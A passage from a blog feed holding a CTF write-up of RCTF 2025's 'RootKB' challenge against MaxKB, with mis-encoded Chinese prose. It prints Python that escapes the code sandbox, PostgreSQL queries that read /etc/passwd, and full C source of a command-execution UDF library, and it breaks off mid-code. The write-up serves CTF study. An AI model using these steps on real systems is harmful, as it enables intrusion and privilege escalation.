&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;&gt;https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/&quot;&gt;https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/621596752&quot;&gt;https://zhuanlan.zhihu.com/p/621596752&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/oldersheep/simple-hessian-rpc&quot;&gt;https://github.com/oldersheep/simple-hessian-rpc&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>RCTF 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/15/RCTF-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/15/RCTF-2025/</id>
    <published>2025-11-15T06:28:18.000Z</published>
    <updated>2026-01-15T08:34:00.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p>n1 çš„ wpï¼š <a href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p><p>ROIS å®˜æ–¹çš„ wpï¼š <a href="https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/">https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/</a></p><p>SU çš„ wpï¼š <a href="https://su-team.cn/post/rctf-2025-su-wu/">https://su-team.cn/post/rctf-2025-su-wu/</a></p><span id="more"></span><hr><h1 id="RootKBï¼ˆå¤ç°ï¼‰"><a href="#RootKBï¼ˆå¤ç°ï¼‰" class="headerlink" title="RootKBï¼ˆå¤ç°ï¼‰"></a>RootKBï¼ˆå¤ç°ï¼‰</h1><p>Try to root myÂ <a href="https://github.com/1Panel-dev/MaxKB/tree/v2">MaxKB</a>.</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> 1panel/maxkb:v2.3.1</span><span class="token instruction"><span class="token keyword">COPY</span> flag /root/flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæ‰“å¼€é¡¹ç›®å¯ä»¥çœ‹åˆ°å‡ ä¸ªæ–°å‡ºçš„ CVEï¼š<a href="https://github.com/1Panel-dev/MaxKB/security/advisories/GHSA-9287-g7px-9rp4">CVE-2025-64511</a>ï¼Œ<a href="https://github.com/1Panel-dev/MaxKB/security/advisories/GHSA-qwvm-x4xh-g2qq">CVE-2025-64703</a></p><p>ç”Ÿæ•ˆç‰ˆæœ¬æ˜¯ 2.3.0 åŠä¹‹å‰ï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªç‰ˆæœ¬çš„æºç ï¼š<a href="https://github.com/1Panel-dev/MaxKB/compare/v2.3.0...v2.3.1">https://github.com/1Panel-dev/MaxKB/compare/v2.3.0...v2.3.1</a></p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251115145642671.png"></p><p>å…³é”®å­—çš„è¿‡æ»¤å¾ˆå¥½ç»•è¿‡ï¼Œå°è¯•ç›´æ¥æ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># return os.popen('env')</span>    b <span class="token operator">=</span> subprocess    <span class="token keyword">return</span> b<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼šå‘ç°è¿ sh éƒ½æ²¡æƒé™ç”¨</p><p>å…ˆçœ‹çœ‹ sandbox ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># return os.popen('env')</span>    <span class="token comment"># b = subprocess</span>    <span class="token comment"># return b.call('env')</span>    <span class="token keyword">return</span> os<span class="token punctuation">.</span>environ    <span class="token comment"># environ(&#123;'LD_PRELOAD': '/opt/maxkb-app/sandbox/sandbox.so', 'HOME': '/opt/maxkb-app/sandbox', 'SHELL': '/opt/py3/bin/python', 'USER': 'sandbox', 'LOGNAME': 'sandbox', 'MAIL': '/var/mail/sandbox', 'LC_CTYPE': 'C.UTF-8'&#125;)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pgsql-getshellï¼ˆno-rootï¼‰"><a href="#pgsql-getshellï¼ˆno-rootï¼‰" class="headerlink" title="pgsql getshellï¼ˆno rootï¼‰"></a>pgsql getshellï¼ˆno rootï¼‰</h2><p>é…ç½®é‡Œé¢æœ‰æ•°æ®åº“çš„å¯†ç ï¼Œæµ‹è¯•å‘ç°å¯ä»¥ç”¨ pgsql æ¥è·³å‡ºæ²™ç›’ï¼Œredis æ²¡æ³•ä¿®æ”¹ config</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>shutil<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>gc<span class="token punctuation">,</span>time<span class="token punctuation">,</span>redis<span class="token punctuation">,</span>psycopg2<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># r = redis.Redis('0.0.0.0',6379,password='Password123@redis')</span>    <span class="token comment"># return r.config_set('dir','/opt/maxkb-app/sandbox/execute')</span>    conn <span class="token operator">=</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token string">"postgres"</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"Password123@postgres"</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">"5432"</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select pg_read_file(\'/etc/passwd\');'</span><span class="token punctuation">)</span>    rows <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251116022026884.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- PostgreSQL 17.6 (Debian 17.6-2.pgdg13+1) on aarch64-unknown-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> pg_language<span class="token punctuation">;</span><span class="token comment">-- internal, c, sql, plpgsql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•æœ¬åœ°ç¼–è¯‘ pg17 çš„ udf.so è¿›è¡Œææƒï¼Œå‚è€ƒ <a href="https://r0fus0d.blog.ffffffff0x.com/post/postgresql-pentest/#cve-2019-9193-postgresql-%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://r0fus0d.blog.ffffffff0x.com/post/postgresql-pentest/#cve-2019-9193-postgresql-%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E</a></p><p>evil.cï¼š <a href="https://github.com/Ape1ron/davinci/blob/29eec71780150adfa50e0e7751ba1782acfeed2f/lib/postgresql/eval_16.c">https://github.com/Ape1ron/davinci/blob/29eec71780150adfa50e0e7751ba1782acfeed2f/lib/postgresql/eval_16.c</a></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* lib_postgresqludf_sys - a library with miscellaneous (operating) system level functionsCopyright (C) 2009-2010  Bernardo Damele A. G.web: http://bernardodamele.blogspot.com/email: bernardo.damele@gmail.comThis library is free software; you can redistribute it and/ormodify it under the terms of the GNU Lesser General PublicLicense as published by the Free Software Foundation; eitherversion 2.1 of the License, or (at your option) any later version.This library is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNULesser General Public License for more details.You should have received a copy of the GNU Lesser General PublicLicense along with this library; if not, write to the Free SoftwareFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>_WIN32<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>_WIN64<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__WIN32__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>WIN32<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_USE_32BIT_TIME_T</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DLLEXP</span> <span class="token expression"><span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUILDING_DLL</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DLLEXP</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;postgres.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fmgr.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>_WIN32<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>_WIN64<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__WIN32__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>WIN32<span class="token punctuation">)</span></span></span>DWORD WINAPI <span class="token function">exec_payload</span><span class="token punctuation">(</span>LPVOID lpParameter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PG_MODULE_MAGIC</span></span>PG_MODULE_MAGIC<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>text <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>retVal<span class="token punctuation">;</span><span class="token keyword">int</span> arg_size <span class="token operator">=</span> <span class="token function">VARSIZE</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">-</span> VARHDRSZ<span class="token punctuation">;</span>retVal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>arg_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span>retVal<span class="token punctuation">,</span> <span class="token function">VARDATA</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">,</span> arg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>retVal<span class="token punctuation">[</span>arg_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">return</span> retVal<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>text <span class="token operator">*</span><span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>text <span class="token operator">*</span>retVal<span class="token punctuation">;</span>retVal <span class="token operator">=</span> <span class="token punctuation">(</span>text <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>VARHDRSZ <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SET_VARSIZE</span></span><span class="token function">SET_VARSIZE</span><span class="token punctuation">(</span>retVal<span class="token punctuation">,</span> VARHDRSZ <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token function">VARATT_SIZEP</span><span class="token punctuation">(</span>retVal<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">+</span> VARHDRSZ<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token function">VARDATA</span><span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">,</span> arg<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> retVal<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_exec<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_exec</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_exec</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>int32 result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span>command <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Only if you want to logelog(NOTICE, "Command execution: %s", command);*/</span>result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_FREE_IF_COPY</span><span class="token punctuation">(</span>argv0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_INT32</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_eva<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_eva</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_eva</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>text <span class="token operator">*</span>result_text<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>FILE <span class="token operator">*</span>pipe<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>line<span class="token punctuation">;</span>int32 outlen<span class="token punctuation">,</span> linelen<span class="token punctuation">;</span>command <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Only if you want to logelog(NOTICE, "Command evaluated: %s", command);*/</span>line <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>outlen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">;</span>pipe <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> pipe<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>linelen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> outlen <span class="token operator">+</span> linelen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>result <span class="token operator">+</span> outlen<span class="token punctuation">,</span> line<span class="token punctuation">,</span> linelen<span class="token punctuation">)</span><span class="token punctuation">;</span>outlen <span class="token operator">=</span> outlen <span class="token operator">+</span> linelen<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pclose</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>result<span class="token punctuation">[</span>outlen<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>result_text <span class="token operator">=</span> <span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_POINTER</span><span class="token punctuation">(</span>result_text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_fileread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_fileread</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_fileread</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>text <span class="token operator">*</span>result_text<span class="token punctuation">;</span>int32 len<span class="token punctuation">;</span>int32 i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span><span class="token keyword">char</span> table<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0123456789ABCDEF"</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>filename <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span>file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">PG_RETURN_NULL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fseek</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span>len <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fseek</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>buffer<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_NULL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>result<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">]</span><span class="token punctuation">;</span>result<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>   <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>result<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>result_text <span class="token operator">=</span> <span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_POINTER</span><span class="token punctuation">(</span>result_text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 